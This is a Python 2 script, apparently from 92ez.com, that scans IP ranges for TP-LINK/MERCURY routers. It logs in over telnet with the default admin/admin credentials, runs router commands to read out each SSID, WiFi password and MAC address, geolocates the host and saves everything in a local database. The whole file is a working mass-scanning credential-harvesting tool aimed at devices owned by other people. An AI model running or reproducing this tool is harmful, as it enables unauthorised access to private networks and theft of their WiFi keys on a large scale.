#!/usr/bin/env python
# coding=utf-8
# code by kbdancer@92ez.com

from threading import Thread
from telnetlib import Telnet
import requests
import sqlite3
import Queue
import time
import json
import sys
import os

reload(sys)
sys.setdefaultencoding('utf8')


def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16, (num & 0x0000ff00) >> 8, num & 0x000000ff)


def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]


class Database:
    db = sys.path[0] + "/TPLINKKEY.db"
    charset = 'utf8'

    def __init__(self):
        self.connection = sqlite3.connect(self.db)
        self.connection.text_factory = str
        self.cursor = self.connection.cursor()

    def insert(self, query, params):
        try:
            self.cursor.execute(query, params)
            self.connection.commit()
        except:
            self.connection.rollback()

    def update(self, query, params):
        try:
            self.cursor.execute(query, params)
            self.connection.commit()
        except:
            self.connection.rollback()

    def query(self, query, params):
        cursor = self.connection.cursor()
        cursor.execute(query, params)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()


def b_thread(ip_list):
    thread_list = []
    queue = Queue.Queue()
    hosts = ip_list
    for host in hosts:
        queue.put(host)
    for x in xrange(0, SET_THREAD):
        thread_list.append(tThread(queue))
    for t in thread_list:
        try:
            t.daemon = True
            t.start()
        except:
            pass
    for t in thread_list:
        t.join()


class tThread(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except Exception, e:
                continue


def get_position_by_ip(host):
    try:
        ip_url = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
        json_data = json.loads(requests.get(url=ip_url, headers=header, timeout=5).text)['data']
        info = [json_data['country'], json_data['region'], json_data['city'], json_data['isp']]
        return info
    except Exception, e:
        print e


def getinfo(host):
    my_sqlite_db = Database()

    username = "admin"
    password = "admin"
    telnet_timeout = 15
    cmd_timeout = 5

    try:
        t = Telnet(host, timeout=telnet_timeout)

        t.read_until("username:", cmd_timeout)
        t.write(username + "\n")
        t.read_until("password:", cmd_timeout)
        t.write(password + "\n")

        t.write("wlctl show\n")
        t.read_until("SSID", cmd_timeout)
        wifi_str = t.read_very_eager()

        t.write("lan show info\n")
        t.read_until("MACAddress", cmd_timeout)
        lan_str = t.read_very_eager()

        t.close()

        if len(wifi_str) > 0:
            # clear extra space
            wifi_str = "".join(wifi_str.split())
            wifi_str = wifi_str.decode('utf-8').encode('utf-8')
            # get SID KEY MAC
            wifi_ssid = wifi_str[1:wifi_str.find('QSS')]
            wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
            router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')

            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

            try:
                query_info = "select * from scanlog where ssid=%s and key=%s"
                query_result = my_sqlite_db.query(query_info, [wifi_ssid, wifi_key])

                if len(query_result) < 1:

                    position_data = get_position_by_ip(host)
                    country = unicode(position_data[0])
                    province = unicode(position_data[1])
                    city = unicode(position_data[2])
                    isp = unicode(position_data[3])

                    insert_info = """INSERT INTO scanlog (`host`,`mac`,`ssid`,`wifikey`,`country`,`province`,`city`,`isp`) VALUES (?,?,?,?,?,?,?,?)"""

                    my_sqlite_db.insert(insert_info, [host, router_mac, wifi_ssid, wifi_key, country, province, city, isp])
                    print '[√] [%s] Info %s  %s  %s => Inserted!' % (current_time, host, wifi_ssid, wifi_key)
                else:
                    print '[x] [%s] Found %s  %s  %s in DB, do nothing!' % (current_time, host, wifi_ssid, wifi_key)
            except Exception, e:
                print e
    except:
        pass


if __name__ == '__main__':
    print '=========================================='
    print ' Scan TPLINK(MERCURY) wifi key by telnet'
    print '           Author 92ez.com'
    print '=========================================='

    global SET_THREAD

    SET_THREAD = int(sys.argv[1])
    begin_ip = sys.argv[2].split('-')[0]
    end_ip = sys.argv[2].split('-')[1]
    ip_list = ip_range(begin_ip, end_ip)
    current_pid = os.getpid()

    print '\n[*] Total ' + str(len(ip_list)) + " IP..."
    print '\n================ Running ================='

    try:
        b_thread(ip_list)
    except KeyboardInterrupt:
        print '\n[*] Kill all thread.'
        os.kill(current_pid, 9)
